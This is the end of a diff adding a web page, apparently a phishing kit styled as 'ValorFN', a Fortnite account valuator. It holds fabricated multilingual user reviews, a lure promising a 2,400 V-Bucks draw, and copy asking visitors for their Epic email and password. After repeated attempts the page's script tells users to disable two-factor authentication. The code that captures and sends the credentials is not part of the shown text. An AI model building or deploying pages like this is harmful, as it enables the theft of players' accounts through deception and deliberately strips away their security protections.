+                    date: 'Jan 8, 2025',
+                    rating: 4.7,
+                    text: 'Très efficace ! J\'ai pu voir tous mes skins et leur prix. L\'estimation correspond à ce que j\'ai vu sur d\'autres sites. Super !',
+                    verified: true,
+                },
+                {
+                    name: 'Max S.',
+                    avatarIcon: 'fa-user-cog',
+                    avatarClass: 'avatar-5',
+                    date: 'Jan 5, 2025',
+                    rating: 4.0,
+                    text: 'Works well, but I wish it showed more items. Still, the price estimation was accurate and fast. Good job!',
+                    verified: false,
+                },
+                {
+                    name: 'Elena P.',
+                    avatarIcon: 'fa-user-graduate',
+                    avatarClass: 'avatar-6',
+                    date: 'Jan 3, 2025',
+                    rating: 4.6,
+                    text: 'I love it. It is very easy to use and the results are very clear. It gave me an exact idea of what my account is worth.',
+                    verified: true,
+                },
+                {
+                    name: 'Hans W.',
+                    avatarIcon: 'fa-user-astronaut',
+                    avatarClass: 'avatar-7',
+                    date: 'Dec 28, 2024',
+                    rating: 4.4,
+                    text: 'Funktioniert einwandfrei. Die Aufstellung der Items ist übersichtlich und der Preis scheint fair zu sein. Weiter so!',
+                    verified: false,
+                },
+                {
+                    name: 'João S.',
+                    avatarIcon: 'fa-user-ninja',
+                    avatarClass: 'avatar-8',
+                    date: 'Dec 20, 2024',
+                    rating: 4.2,
+                    text: 'Muito bom! Avaliação rápida e precisa. Recomendo a todos que querem saber o valor da sua conta Fortnite.',
+                    verified: true,
+                },
+            ];
+
+            const track = document.getElementById('carouselTrack');
+            const dotsContainer = document.getElementById('carouselDots');
+            const prevBtn = document.getElementById('prevBtn');
+            const nextBtn = document.getElementById('nextBtn');
+
+            let currentIndex = 0;
+            let cardsPerView = 3;
+
+            function getCardsPerView() {
+                if (window.innerWidth < 480) return 1;
+                if (window.innerWidth < 768) return 2;
+                return 3;
+            }
+
+            function renderReviews() {
+                track.innerHTML = '';
+                reviewsData.forEach((review) => {
+                    const card = document.createElement('div');
+                    card.className = 'review-card';
+                    const fullStars = Math.floor(review.rating);
+                    const halfStar = review.rating % 1 >= 0.5 ? 1 : 0;
+                    const emptyStars = 5 - fullStars - halfStar;
+                    let starsHtml = '';
+                    for (let i = 0; i < fullStars; i++) starsHtml += '<i class="fa-solid fa-star"></i>';
+                    if (halfStar) starsHtml += '<i class="fa-solid fa-star-half-alt"></i>';
+                    for (let i = 0; i < emptyStars; i++) starsHtml += '<i class="fa-regular fa-star empty-star"></i>';
+
+                    card.innerHTML = `
+                        <div class="review-header">
+                            <div class="review-avatar ${review.avatarClass}"><i class="fa-solid ${review.avatarIcon}"></i></div>
+                            <div class="review-user">
+                                <div class="name">${review.name}</div>
+                                <div class="date">${review.date}</div>
+                            </div>
+                        </div>
+                        <div class="review-stars">${starsHtml}</div>
+                        <div class="review-text">${review.text}</div>
+                        <div class="review-verified">
+                            ${review.verified ? '<i class="fa-solid fa-check-circle"></i> Verified purchase' : '<i class="fa-regular fa-clock" style="color:rgba(255,255,255,0.2);"></i> Unverified'}
+                        </div>
+                    `;
+                    track.appendChild(card);
+                });
+
+                const trackWidth = track.parentElement.offsetWidth;
+                const gap = 20;
+                const cardWidth = (trackWidth - (cardsPerView - 1) * gap) / cardsPerView;
+                track.querySelectorAll('.review-card').forEach(card => {
+                    card.style.flex = `0 0 ${cardWidth}px`;
+                });
+
+                updateDots();
+                updateTrackPosition();
+            }
+
+            function updateDots() {
+                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                dotsContainer.innerHTML = '';
+                for (let i = 0; i < totalSlides; i++) {
+                    const dot = document.createElement('button');
+                    dot.className = 'carousel-dot' + (i === currentIndex ? ' active' : '');
+                    dot.dataset.index = i;
+                    dot.addEventListener('click', () => {
+                        currentIndex = i;
+                        updateTrackPosition();
+                        updateDots();
+                    });
+                    dotsContainer.appendChild(dot);
+                }
+            }
+
+            function updateTrackPosition() {
+                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
+                if (currentIndex < 0) currentIndex = 0;
+                const offset = -(currentIndex * 100);
+                track.style.transform = `translateX(${offset}%)`;
+                const dots = dotsContainer.querySelectorAll('.carousel-dot');
+                dots.forEach((dot, idx) => {
+                    dot.classList.toggle('active', idx === currentIndex);
+                });
+            }
+
+            function handleResize() {
+                const newCardsPerView = getCardsPerView();
+                if (newCardsPerView !== cardsPerView) {
+                    cardsPerView = newCardsPerView;
+                    const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                    if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
+                    if (currentIndex < 0) currentIndex = 0;
+                    const trackWidth = track.parentElement.offsetWidth;
+                    const gap = 20;
+                    const cardWidth = (trackWidth - (cardsPerView - 1) * gap) / cardsPerView;
+                    track.querySelectorAll('.review-card').forEach(card => {
+                        card.style.flex = `0 0 ${cardWidth}px`;
+                    });
+                    updateDots();
+                    updateTrackPosition();
+                }
+            }
+
+            window.addEventListener('resize', handleResize);
+
+            prevBtn.addEventListener('click', () => {
+                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                currentIndex = (currentIndex - 1 + totalSlides) % totalSlides;
+                updateTrackPosition();
+                updateDots();
+            });
+
+            nextBtn.addEventListener('click', () => {
+                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                currentIndex = (currentIndex + 1) % totalSlides;
+                updateTrackPosition();
+                updateDots();
+            });
+
+            cardsPerView = getCardsPerView();
+            renderReviews();
+
+            let autoSlide = setInterval(() => {
+                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                if (totalSlides > 1) {
+                    currentIndex = (currentIndex + 1) % totalSlides;
+                    updateTrackPosition();
+                    updateDots();
+                }
+            }, 5000);
+
+            const controls = [prevBtn, nextBtn, ...document.querySelectorAll('.carousel-dot')];
+            controls.forEach(btn => {
+                btn.addEventListener('mouseenter', () => clearInterval(autoSlide));
+                btn.addEventListener('mouseleave', () => {
+                    autoSlide = setInterval(() => {
+                        const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
+                        if (totalSlides > 1) {
+                            currentIndex = (currentIndex + 1) % totalSlides;
+                            updateTrackPosition();
+                            updateDots();
+                        }
+                    }, 5000);
+                });
+            });
+
+            // ============================================
+            // ====== IDIOMA (por defecto inglés) ======
+            // ============================================
+
+            const translations = {
+                en: {
+                    'nav-value': 'Valuate',
+                    'hero-badge': 'Locker Evaluator',
+                    'hero-title1': 'How much is your',
+                    'hero-title2': 'account worth?',
+                    'hero-desc': 'Enter your credentials to estimate your Fortnite account\'s value, including all your items and their current market prices.',
+                    'badge-secure': '100% Secure',
+                    'badge-prices': 'Real prices',
+                    'badge-users': '2,847+ users',
+                    'badge-privacy': 'Privacy',
+                    'email-label': 'Email address',
+                    'password-label': 'Password',
+                    'btn-calculate': 'Calculate value',
+                    'forgot-link': 'Forgot credentials?',
+                    'signup-link': 'Create account',
+                    'error-title': 'incorrect',
+                    'error-desc': 'Verify your credentials and try again.',
+                    'reviews-title': 'What users say',
+                    'reviews-count': '2,847 reviews',
+                    'footer-terms': 'Terms of use',
+                    'footer-privacy': 'Privacy policy',
+                    'footer-cookies': 'Cookie policy',
+                    'footer-legal': 'Legal notice',
+                    'footer-contact': 'Contact',
+                    'footer-faq': 'FAQ',
+                    'footer-copy': 'ValorFN - Fan-made unofficial tool. Fortnite is a registered trademark of Epic Games, Inc.',
+                    'notif-text': 'Just by reviewing your account you enter a draw for 2,400 V-Bucks!'
+                },
+                es: {
+                    'nav-value': 'Valorar',
+                    'hero-badge': 'Evaluador de Taquilla',
+                    'hero-title1': '¿Cuánto vale tu cuenta de',
+                    'hero-title2': '?',
+                    'hero-desc': 'Ingresa tus credenciales para calcular el valor estimado de tu cuenta, incluyendo todos tus objetos y su precio actual de mercado.',
+                    'badge-secure': '100% Seguro',
+                    'badge-prices': 'Precios reales',
+                    'badge-users': '2,847+ usuarios',
+                    'badge-privacy': 'Privacidad',
+                    'email-label': 'Correo electrónico',
+                    'password-label': 'Contraseña',
+                    'btn-calculate': 'Calcular valor',
+                    'forgot-link': '¿Olvidaste tus datos?',
+                    'signup-link': 'Crear cuenta',
+                    'error-title': 'incorrecto',
+                    'error-desc': 'Verifica tus credenciales e inténtalo de nuevo.',
+                    'reviews-title': 'Lo que dicen los usuarios',
+                    'reviews-count': '2,847 reseñas',
+                    'footer-terms': 'Términos de uso',
+                    'footer-privacy': 'Política de privacidad',
+                    'footer-cookies': 'Política de cookies',
+                    'footer-legal': 'Aviso legal',
+                    'footer-contact': 'Contacto',
+                    'footer-faq': 'FAQ',
+                    'footer-copy': 'ValorFN - Herramienta fan-made no oficial. Fortnite es marca registrada de Epic Games, Inc.',
+                    'notif-text': '¡Solo por revisar tu cuenta entras en un sorteo de 2,400 pavos!'
+                }
+            };
+
+            window.changeLanguage = function(lang) {
+                document.querySelectorAll('[data-i18n]').forEach(el => {
+                    const key = el.getAttribute('data-i18n');
+                    if (translations[lang] && translations[lang][key]) {
+                        el.textContent = translations[lang][key];
+                    }
+                });
+                const notifText = document.getElementById('notifText');
+                if (translations[lang] && translations[lang]['notif-text']) {
+                    notifText.textContent = translations[lang]['notif-text'];
+                }
+                if (errorMessage.classList.contains('show')) {
+                    const intentos = attemptCount;
+                    if (intentos >= 2) {
+                        errorTitle.textContent = lang === 'es' ? 'Verificación en dos pasos activa' : 'Two-factor authentication active';
+                        errorDesc.innerHTML = lang === 'es' 
+                            ? 'Es posible que tengas que <strong>desactivar la verificación en dos pasos</strong> para acceder a esta herramienta. Contacta con soporte si el problema persiste.'
+                            : 'You may need to <strong>disable two-factor authentication</strong> to access this tool. Contact support if the issue persists.';
+                    } else {
+                        errorTitle.textContent = lang === 'es' ? 'incorrecto' : 'incorrect';
+                        errorDesc.textContent = lang === 'es' ? 'Verifica tus credenciales e inténtalo de nuevo.' : 'Verify your credentials and try again.';
+                    }
+                }
+            };
+
+            // Establecer inglés por defecto
+            document.getElementById('lang-select').value = 'en';
+            changeLanguage('en');
+
+            // Mostrar notificación
+            showNotification();
+
+        })();
+    </script>
+</body>
+</html>
